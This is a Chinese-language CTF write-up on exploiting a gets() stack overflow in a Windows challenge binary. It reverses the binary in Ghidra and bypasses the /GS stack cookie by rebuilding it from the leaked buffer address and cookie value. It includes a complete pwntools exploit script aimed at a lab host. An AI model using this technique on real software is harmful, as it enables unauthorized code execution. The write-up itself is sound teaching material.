# 系统层漏洞利用与逆向分析-GS缓冲区安全检查利用-G1 WriteUp

靶机地址为 172.17.174.74:9999，附件提供了运行在靶机上的 `challenge.exe`（32 位 Windows PE）。将 `challenge.exe` 导入 Ghidra 进行分析，自动分析完成后首先搜索函数名，找到 `get_flag` 位于地址 `0x00401000`，这就是我们需要劫持控制流到达的目标函数。反编译 `get_flag` 得到如下伪代码：

```c
void get_flag(void)
{
  GetFlag();
  ExitProcess(0);
}
```

该函数从 `getflag.dll` 调用 `GetFlag()` 输出一次性凭证，随后立即调用 `ExitProcess(0)` 退出进程。接下来分析程序的主逻辑函数 `FUN_00401020`，Ghidra 反编译得到的完整伪代码如下：

![image.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/20260824143506693.png)

```c
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined4 FUN_00401020(void)
{
  undefined *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  undefined1 local_108 [256];
  uint local_8;

  local_8 = DAT_0041d040 ^ (uint)&stack0xfffffffc;
  iVar4 = 0;
  iVar3 = 4;
  uVar2 = 0;
  puVar1 = FUN_004041f8(0);
  FUN_00404527((int)puVar1,uVar2,iVar3,iVar4);
  iVar4 = 0;
  iVar3 = 4;
  uVar2 = 0;
  puVar1 = FUN_004041f8(1);
  FUN_00404527((int)puVar1,uVar2,iVar3,iVar4);
  iVar4 = 0;
  iVar3 = 4;
  uVar2 = 0;
  puVar1 = FUN_004041f8(2);
  FUN_00404527((int)puVar1,uVar2,iVar3,iVar4);
  FUN_00401130(0x41d000);
  FUN_00401130(0x41d010);
  FUN_00401130(0x41d020);
  FUN_004063f5(local_108);
  FUN_00401130(0x41d034);
  return 0;
}
```

Ghidra 的反编译输出中变量名和函数名较为晦涩，需要结合字符串引用和汇编上下文进行还原。通过 Ghidra 的 inspect_memory_content 功能查看几个字符串常量地址的内容：`0x41d000` 处为 `"Buffer @ %p\n"`，`0x41d010` 处为 `"Cookie : %08X\n"`，`0x41d020` 处为 `"Enter your name: "`，`0x41d034` 处为 `"Hello, %s!\n"`。再结合 `FUN_004041f8` 返回 FILE 指针、`FUN_00404527` 为 setvbuf、`FUN_00401130` 为 printf、`FUN_004063f5` 为 gets 等判断，将伪代码还原为人类易读的形式：

```c
int main(void)
{
    char buf[256];
    uint stack_cookie = __security_cookie ^ EBP;

    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("Buffer @ %p\n", buf);
    printf("Cookie : %08X\n", __security_cookie);
    printf("Enter your name: ");

    gets(buf);

    printf("Hello, %s!\n", buf);
    return 0;
    // epilogue: __security_check_cookie(stack_cookie ^ EBP)
}
```

阅读还原后的代码，漏洞一目了然。程序使用 gets() 向 256 字节的栈缓冲区 buf 读取输入，gets() 不检查长度，因此存在经典的栈溢出。但本题使用了 MSVC 的 /GS 编译选项，在函数序言处将全局安全 Cookie（`DAT_0041d040`，即 `__security_cookie`）与 EBP 异或后存放在栈上紧邻缓冲区的位置（`local_8`），函数返回前会取出该值再次与 EBP 异或，结果必须等于全局 Cookie，否则调用 `__report_gsfailure` 终止进程。这意味着单纯溢出覆盖返回地址会破坏栈上的 Cookie，被安全检查拦截。

关键在于程序主动泄露了绕过 GS 保护所需的全部信息。第一条 printf 输出 `"Buffer @ %p\n"` 泄露了缓冲区在栈上的地址；第二条 printf 输出 `"Cookie : %08X\n"` 直接泄露了全局安全 Cookie 的值。有了这两个值就能完整重建栈上的 Cookie：缓冲区地址加上 `0x104` 即可算出 EBP 的值（因为汇编中 `LEA EAX, [EBP-0x104]` 取缓冲区地址），而栈上 Cookie 等于 `__security_cookie ^ EBP`。查看 `FUN_00401020` 的汇编可以确认这一栈帧布局：

![image.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/20260824143621107.png)

```asm
00401020  PUSH EBP
00401021  MOV  EBP, ESP
00401023  SUB  ESP, 0x104            ; 分配 0x104 字节栈空间
00401029  MOV  EAX, [0x0041d040]     ; 加载全局 Cookie
0040102e  XOR  EAX, EBP              ; 与 EBP 异或
00401030  MOV  [EBP-0x4], EAX        ; 存入栈顶（紧邻 saved EBP）
          ...
004010b3  LEA  EDX, [EBP-0x104]      ; 缓冲区起始地址
004010b9  PUSH EDX
004010ba  CALL gets
          ...
004010d8  MOV  ECX, [EBP-0x4]        ; 取回栈上 Cookie
004010db  XOR  ECX, EBP              ; 异或还原
004010dd  CALL __security_check_cookie  ; 与全局 Cookie 比对
004010e2  MOV  ESP, EBP
004010e4  POP  EBP
004010e5  RET
```

从汇编可以确认栈帧的精确布局：缓冲区从 `EBP-0x104` 开始，Cookie 在 `EBP-0x4`，两者之间恰好 256 字节（`0x104 - 0x4 = 0x100`）。Cookie 之后依次是 saved EBP（4 字节）和返回地址（4 字节）。因此溢出 payload 的结构为：256 字节填充 + 4 字节伪造 Cookie + 4 字节任意 saved EBP + 4 字节返回地址（`get_flag` 的地址 `0x00401000`）。

基于以上分析，使用 pwntools 编写利用脚本 `exploit.py`：

```python
from pwn import *

context.log_level = 'info'

r = remote('172.17.174.74', 9999)

# Parse "Buffer @ <addr>"
line1 = r.recvline()
log.info(line1.decode().strip())
buf_addr = int(line1.split(b'@ ')[1].strip(), 16)

# Parse "Cookie : <value>"
line2 = r.recvline()
log.info(line2.decode().strip())
global_cookie = int(line2.split(b': ')[1].strip(), 16)

# Receive prompt
r.recvuntil(b': ')

# Compute
ebp = buf_addr + 0x104
stack_cookie = global_cookie ^ ebp
get_flag = 0x00401000

log.info(f"buf_addr   = {hex(buf_addr)}")
log.info(f"EBP        = {hex(ebp)}")
log.info(f"cookie     = {hex(global_cookie)}")
log.info(f"stack_cook = {hex(stack_cookie)}")

# [256 padding] [cookie 4] [saved_ebp 4] [ret = get_flag 4]
payload  = b'A' * 256
payload += p32(stack_cookie)
payload += p32(0xdeadbeef)  # saved EBP
payload += p32(get_flag)

r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")
```

脚本首先连接靶机，解析程序输出的缓冲区地址和全局 Cookie 值。由缓冲区地址加 `0x104` 算出 EBP，再将全局 Cookie 与 EBP 异或得到栈上应存放的 Cookie 值。构造 payload 时，前 256 字节用 `'A'` 填充缓冲区，随后写入伪造的 Cookie，再放一个任意值（`0xdeadbeef`）作为 saved EBP（因为 get_flag 不会返回，所以无需关心帧指针），最后写入 `get_flag` 的地址 `0x00401000` 覆盖返回地址。发送 payload 后，函数返回时 `__security_check_cookie` 取出我们伪造的 Cookie 与 EBP 异或，结果恰好等于全局 Cookie，安全检查通过，程序正常执行 RET 指令跳转到 `get_flag`，输出一次性凭证：

![exploit_run.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/exploit_run.png)

将获取到的 token 通过 curl 发送到 flag 兑换服务，最终获取 flag：

![curl_flag.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/curl_flag.png)
